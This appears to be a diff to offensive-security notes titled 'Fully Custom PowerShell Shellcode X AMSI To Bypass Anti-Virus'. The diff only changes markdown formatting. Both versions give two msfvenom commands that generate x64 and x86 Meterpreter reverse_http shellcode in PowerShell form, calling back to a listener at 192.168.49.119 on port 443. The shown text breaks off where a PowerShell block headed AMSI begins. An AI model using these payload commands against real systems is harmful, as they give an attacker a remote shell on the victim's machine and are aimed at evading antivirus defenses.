@@ -1,8 +1,9 @@
-### Fully Custom PowerShell Shellcode X AMSI To Bypass Anti-Virus
+# Fully Custom PowerShell Shellcode X AMSI To Bypass Anti-Virus
 
-# Msfvenom Shellcode
-msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.49.119 LPORT=443 EXITFUNC=thread -f psh1 //x64
-msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.119 LPORT=443 EXITFUNC=thread -f psh1 //x86
+#### Msfvenom Shellcode
+
+`msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.49.119 LPORT=443 EXITFUNC=thread -f psh1 //x64`
+`msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.119 LPORT=443 EXITFUNC=thread -f psh1 //x86`
 
 ```pwsh
 # AMSI
